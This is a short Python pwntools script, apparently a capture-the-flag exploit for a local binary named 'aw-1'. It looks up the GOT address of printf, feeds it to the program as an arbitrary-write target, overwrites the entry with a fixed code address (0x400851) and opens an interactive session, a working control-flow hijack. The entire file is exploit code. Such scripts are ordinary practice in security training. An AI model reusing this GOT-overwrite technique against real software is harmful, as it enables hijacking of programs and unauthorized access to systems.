#!/usr/bin/env python

from pwn import *
import os

p = process("./aw-1")
got = p.elf.got['printf']
#print(got)
#print(hex(got))

print(p.recv())
byts = 8
print(byts)
p.sendline(str(byts))
print(p.recv())
#print(hex(got))

p.sendline(hex(got))
print(hex(got))
print(p.recv())

buf = p64(0x400851)
print(buf)
p.sendline(buf)
#print((0x7feeeaa37d10))
#p.sendline(p64(0x7feeeaa37d10))
p.interactive()
